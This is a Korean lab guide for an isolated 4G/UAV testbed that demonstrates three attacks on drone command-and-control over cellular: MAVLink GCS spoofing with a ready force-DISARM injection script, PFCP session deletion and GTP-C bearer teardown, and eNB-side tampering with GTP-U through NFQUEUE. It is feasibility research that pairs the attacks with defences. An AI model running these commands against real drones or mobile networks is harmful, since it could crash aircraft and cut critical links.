testbed-4g 공격 실습 가이드 — TM1 / TM2 / TM3

Open5GS EPC(CUPS) + srsRAN(ZMQ) + ArduPilot SITL 로 구성된 셀룰러 C2 테스트베드에서 TM1/TM2/TM3 세 위협모델의 수행 가능성을 실측 검증하기 위한 절차서. 각 공격마다 접속할 컨테이너, 사전 확인 항목, 기초 명령어, 성공 판정 지표, 원복 방법을 담았습니다. 개념 배경은 별도 TM1/TM2/TM3 정리 자료를 참조.

⚠ 사용 범위 · 권한 경계
이 문서는 격리된 자체 테스트베드(로컬 Docker/WSL2) 에서의 방어 연구·수행 가능성 검증만을 대상으로 한다. 실제 이동통신망·타인의 무선/코어 자산·운용 중인 UAV 에 대한 적용은 금지이며 불법이다. 프로젝트 역할경계상 인프라·배선은 준비되어 있고, 공격 실행과 판단은 실습자(사용자) 본인의 책임이다. 모든 명령은 실행 전 대상이 자체 테스트베드 컨테이너임을 확인할 것.

0-4. 실습용 SITL 기동 (주입 엔드포인트 개방)

TM1(주입)·TM3(변조) 을 관측하려면 UAV SITL 이 셀룰러 상에서 MAVLink 를 수신(listen) 해야 한다. 기존 45-g1-gazebo.sh/40-g1-c2.sh 는 SITL 을 udpclient→GCS 로만 띄우므로, 실습에선 UAV 측에 udpin:14550 을 추가로 연다(공격자가 UAV:14550 으로 도달 가능해짐 = 위협모델의 표적면).

# Gazebo 시각화까지 함께 볼 경우: 45-g1-gazebo.sh 의 arducopter 인자에 # --serial1 udpin:0.0.0.0:14550 를 추가해 기동 (serial0=GCS C2 유지) # 빠른 실습(물리만)일 경우 아래처럼 직접 기동: GCS=192.168.100.3 docker rm -f dah4g-sitl 2>/dev/null docker run -d --name dah4g-sitl --network container:srsue_zmq dah-testbed-air \ sh -c "cd /tmp && exec /home/ardu/ardupilot/build/sitl/bin/arducopter \ --model quad --speedup 1 -I0 \ --defaults /home/ardu/ardupilot/Tools/autotest/default_params/copter.parm \ --home 37.5665,126.9780,30,0 \ --serial0 udpclient:$GCS:14550 \ --serial1 udpin:0.0.0.0:14550" # ← 주입 표적 포트
이 --serial1 udpin 개방은 "UAV 가 셀룰러 상에서 C2 서비스를 노출한다"는 현실 전제를 재현하는 인프라 준비이지 공격 자체가 아니다. 실제 배치에서 UAV↔GCS 가 UDP 로 오가면 이 표적면이 자연히 존재한다.
1TM1 — 동일 APN Rogue UE 를 통한 MAVLink 주입
공격자 UE(.4)가 같은 APN 풀에서 UAV(.2)에 직접 도달 → SysID 255 로 GCS 사칭 → 명령 주입

위협 요약. 같은 APN(internet) 에 붙은 UE 들은 UPF hairpin 으로 서로 IP 도달이 된다(UE-to-UE). MAVLink 는 인증이 없으므로(Signing OFF 전제), ROGUE 가 GCS(SysID 255)를 사칭해 UAV 의 14550 으로 명령을 보내면 UAV 는 정상 GCS 로 오인해 수용한다.

1-1. 공격자 위치 · 접속

공격자는 ROGUE UE 컨테이너 srsue_zmq3 의 네트워크 네임스페이스에서 동작해야 트래픽의 출발 IP 가 셀룰러 192.168.100.4 가 된다. pymavlink 가 있는 dah-testbed-air 이미지를 그 netns 로 실행한다.

# ROGUE netns 로 진입해 대화형 셸(도구 확인용) docker exec -it srsue_zmq3 bash # └ 여기서 나가는 패킷의 src = 192.168.100.4 (동일 APN UE)

1-2. 사전 확인 (표적 식별)

# (A) UAV 도달성 — 0-3 의 UE-to-UE ping 이 성공해야 함 docker exec srsue_zmq3 ping -I tun_srsue -c3 192.168.100.2 # (B) UAV 의 MAVLink 포트가 열려 수신 중인지 — SITL netns(=srsue_zmq)에서 확인 # dah4g-sitl 는 srsue_zmq netns 를 공유하므로 소켓이 여기서 보인다 docker exec srsue_zmq ss -unlp | grep 14550 # (C) 정상 C2 흐름 관찰(선택) — UAV↔GCS MAVLink 가 셀룰러로 흐르는지 docker exec srsue_zmq tcpdump -ni any udp port 14550 -c 10

1-3. 공격 실행 — GCS 사칭 · 명령 주입

아래 스크립트를 ROGUE netns 에서 실행한다. source_system=255(GCS 기본 SysID)로 HEARTBEAT 를 보내 UAV 가 이 발신자를 GCS 로 등록하게 한 뒤, Force-DISARM(cmd 400, param2=21196)을 주입한다.

# ROGUE(.4) netns 에서 pymavlink 로 주입 — 표적 = UAV 192.168.100.2:14550 docker run -i --rm --network container:srsue_zmq3 dah-testbed-air python3 - <<'PY' from pymavlink import mavutil import time TGT = 'udpout:192.168.100.2:14550' m = mavutil.mavlink_connection(TGT, source_system=255, source_component=190) # 1) GCS 사칭 HEARTBEAT 를 몇 번 보내 발신자를 '정상 GCS'로 각인 for _ in range(5): m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0) time.sleep(0.2) # 2) Force-DISARM 주입 (비행 중이면 모터 강제 정지 → 추락) m.mav.command_long_send(1, 1, mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 0, 21196, 0,0,0,0,0) # param1=0(disarm) param2=21196(force) print('[TM1] force-DISARM 주입 송신 완료 (SysID 255 사칭)') PY

2TM2 — PFCP 세션 삭제 / GTP-C Bearer 파괴 (가용성)
내용을 보지 않고 C2 링크 자체를 끊는다 — Open5GS EPC 는 CUPS 라 Sxa/Sxb PFCP(8805) 존재

위협 요약. 코어 제어망에 도달한 공격자가 인증되지 않는 PFCP(UDP 8805)로 UAV 세션의 SEID 를 삭제하거나, S11 GTP-C(2123)로 Bearer 를 강제 해제하면 UAV 의 GTP-U 터널이 철거되어 C2 가 두절된다. MAVLink 서명으로도 못 막는다(연결 자체를 파괴하므로).

전제: TM2 는 코어 제어망 접근을 요구한다. 실제 배치라면 TM1 이후 측면이동이 필요하지만, 본 테스트베드는 모든 NE 가 같은 docker_open5gs_default 브리지에 격리 없이 놓여 있으므로("환경 취약형" 전제) 코어망 도달이 이미 성립한다 — 이 점을 보고서엔 명시적 전제로 기술할 것.

2-1. 공격자 위치 · 접속

EPC 제어망(172.22.0.0/24)에 붙은 공격자 노드가 필요하다. 도구가 갖춰진 컨테이너를 그 네트워크에 임시로 띄운다.

# 정찰·캡처 도구 컨테이너를 EPC 망에 부착 (netshoot = tcpdump/nmap/scapy 등 내장) docker run -it --rm --name dah4g-attacker \ --network docker_open5gs_default --cap-add NET_RAW --cap-add NET_ADMIN \ nicolaka/netshoot bash

2-2. 사전 확인 — 코어 도달 · PFCP 노출 · 평문 여부

# (A) 제어망 호스트 탐색 nmap -sn 172.22.0.0/24 # (B) PFCP(8805)·GTP-C(2123) 개방 NE 식별 (sgwu/upf/sgwc/smf/mme) nmap -sU -p 8805,2123 172.22.0.0/24 # (C) PFCP 가 평문·무인증임을 관찰 — SGW-U/UPF 에서 Sxa/Sxb 캡처 # (스위치 브리지라 타 NE 트래픽은 안 보이므로, 대상 NE 자체에서 캡처) docker exec sgwu tcpdump -ni any udp port 8805 -X -c 20 docker exec upf tcpdump -ni any udp port 8805 -X -c 20 # └ Session Establishment/Report 메시지에서 활성 SEID·노드 IP 가 평문 노출
여기까지(A~C)만으로도 "PFCP 가 도달 가능·평문·발신자 인증 없음" 이라는 TM2 의 구조적 결함이 실측된다. 3GPP TS 29.244 는 Sxa/Sxb 발신자 인증을 의무화하지 않고 IPsec 을 권고(옵션)로만 둔다.

2-3. 공격 실행 — 세션 삭제 / Bearer 해제

(a) PFCP Session Deletion (4G CUPS 최우선 경로)

1
SGW-U/UPF(8805)로 PFCP Association Setup Request → 정상 SGW-C/SMF 로 위장 수립
2
2-2(C) 캡처에서 얻은 UAV 세션 SEID 지정
3
PFCP Session Deletion Request 전송 → GTP-U 터널 철거 → UAV C2 두절
# PFCP 클라이언트로 삭제 요청 (SEID 는 2-2 캡처값으로 치환) # PFCP 는 scapy 기본 미지원 → PFCP 지원 도구/스크립트 사용 # (TM2 자료의 pfcp_attack.py 형태, 또는 open5gs libpfcp 기반 PoC) python3 pfcp_attack.py --target <UPF_IP> --action association_setup python3 pfcp_attack.py --target <UPF_IP> --action session_deletion --seid <UAV_SEID>

(b) GTP-C S11 Delete Bearer (4G 네이티브 대안)

# MME(172.22.0.9)↔SGW-C 간 S11(GTP-C UDP 2123) 로 Delete Bearer Request # 신뢰관계 기반 인증만 있으므로 동일 세그먼트 노드가 MME 사칭 가능 docker exec mme tcpdump -ni any udp port 2123 -c 20 # TEID/세션 식별 # → GTP-C 라이브러리로 Delete Bearer/Session Request 주입
4G/5G 정정(자료 반영): PFCP 세션 삭제는 EPC 가 CUPS 라 4G 가능. 반면 SBI(HTTP/2) 기반 NRF/SMF 크래시는 5G SA 전용 — EPC 엔 SBA 자체가 없으므로 이 테스트베드에서 재현 대상이 아니다.

2-4. 성공 판정 — 무엇을 확인하나

  • GCS 가 UAV HEARTBEAT 를 수신 중단 (g1_gcs.py 가 타임아웃)
  • UAV 의 데이터 베어러 소실 — docker exec srsue_zmq ping -I tun_srsue 192.168.100.1 (GW) 실패
  • SITL 이 GCS failsafe 진입(모드 전환/RTL/LAND) — SITL 로그·Gazebo 관측
  • PFCP 캡처상 삭제 요청에 SGW-U/UPF 가 인증 검증 없이 응답
# 두절 관측: GCS netns 에서 하트비트 대기 → 타임아웃이면 C2 두절 실증 docker run -i --rm --network container:srsue_zmq2 dah-testbed-air \ python3 - < testbed-4g/scripts/g1_gcs.py
TM2 는 기밀성/무결성이 아니라 가용성 공격이라 MAVLink Signing 이 무력하다. 방어는 코어 제어망 분리 + PFCP IPsec(Sxb') + S11 ACL 이다(4장).
배경: TM2_PFCP_GTPC_파괴_정리.html · 3GPP TS 29.244/29.274/29.272 · Open5GS CUPS
3TM3 — 소프트웨어 eNB(S1-U GTP-U) 평문 변조
eNB 는 PDCP 복호화 종단 — 그 뒤 S1-U GTP-U(2152)는 평문. 그 위치를 장악해 MAVLink 를 변조

위협 요약. UAV↔eNB 무선 구간(ZMQ)은 PDCP 로 보호되지만 eNB 에서 복호화가 끝난다. 이후 eNB→EPC 의 S1-U GTP-U 구간은 평문이므로, eNB 를 장악한 자는 그 안의 MAVLink 를 들여다보고 조작할 수 있다. 본 테스트베드의 eNB 는 소프트웨어 컨테이너(srsenb_zmq) = 자료의 "vRAN/소프트웨어 eNB" 경로에 해당하며, docker exec(≈ 자료의 kubectl exec)로 그 위치를 확보한다.

자료의 또 다른 경로인 Rogue eNB(RF 신호 우위) 는 SDR 하드웨어가 필요해 ZMQ 가상 라디오 테스트베드에서는 재현 불가(정직한 한계). 본 랩에서 재현 가능한 TM3 = 소프트웨어 eNB 장악 후 S1-U 변조이며, 이것이 Operation Spiderweb(4G)에 가장 직결된다.

3-1. 공격자 위치 · 접속

# UAV 의 eNB 컨테이너(=PDCP 종단) 셸 확보 docker exec -it srsenb_zmq bash # └ 이 위치가 곧 "탈취된 eNB" = S1-U GTP-U 평문 구간의 종단

3-2. 사전 확인 — S1-U 평문에 MAVLink 가 보이는가

# eNB→SGW-U 의 S1-U GTP-U(UDP 2152) 캡처. GTP-U 헤더(8B) 안쪽에 MAVLink # v2 매직 0xFD / v1 매직 0xFE 바이트가 평문으로 보이면 = 변조 표면 실증 docker exec srsenb_zmq tcpdump -ni any udp port 2152 -X -c 20 | grep -iE 'fd|fe'
GTP-U 페이로드에서 MAVLink 매직바이트가 평문으로 확인되면, "eNB 이후 구간은 암호화되지 않는다"는 TM3 의 핵심 전제가 실측된 것이다(PDCP 알고리즘이 ARIA/SEED 여도 무관 — 복호화가 이미 끝난 지점).

3-3. 공격 실행 — NFQUEUE 로 실시간 변조

iptables 로 S1-U GTP-U 패킷을 NFQUEUE 로 우회시키고, netfilterqueue+scapy 스크립트가 GTP-U 헤더를 벗겨 내부 MAVLink 를 수정(예: 명령 치환/드롭) 후 재주입한다. 도구가 없으면 해당 도구를 갖춘 사이드카를 eNB netns 로 띄운다.

# (1) eNB netns 에서 S1-U 를 NFQUEUE 로 가로채기 docker exec srsenb_zmq iptables -I FORWARD -p udp --dport 2152 -j NFQUEUE --queue-num 0 docker exec srsenb_zmq iptables -I OUTPUT -p udp --dport 2152 -j NFQUEUE --queue-num 0 # (2) 변조 스크립트 실행 (scapy + NetfilterQueue). 도구 미설치 시 사이드카: # docker run --network container:srsenb_zmq --cap-add NET_ADMIN <scapy이미지> python3 mangle.py # mangle.py 개요: # pkt → IP/UDP(2152)/GTP-U(8B 헤더 skip) → 내부 IP/UDP(14550)/MAVLink # MAVLink 파싱 → 특정 필드 변조(예: NAV_LAND 삽입, 좌표 변경) → CRC 재계산 → accept
주의: NFQUEUE 규칙은 처리 스크립트가 큐를 소비하지 않으면 해당 트래픽이 드롭되어 C2 가 끊긴다. 반드시 소비 스크립트를 먼저 준비하고, 실습 후 3-5 로 규칙을 제거할 것.

3-4. 성공 판정 — 무엇을 확인하나

  • GCS/SITL 에서 보내지 않은 명령이 반영되거나(변조), 특정 명령이 사라짐(드롭)
  • UAV·GCS 양측 모두 변조를 탐지하지 못함(무결성 부재) — Signing OFF 전제
  • S1-U 캡처에서 원본과 다른 MAVLink 페이로드가 나가는 것을 확인
  • MAVLink 서명 ON(4장) 으로 전환 시 변조 패킷이 거부됨 → 방어 대비 실증
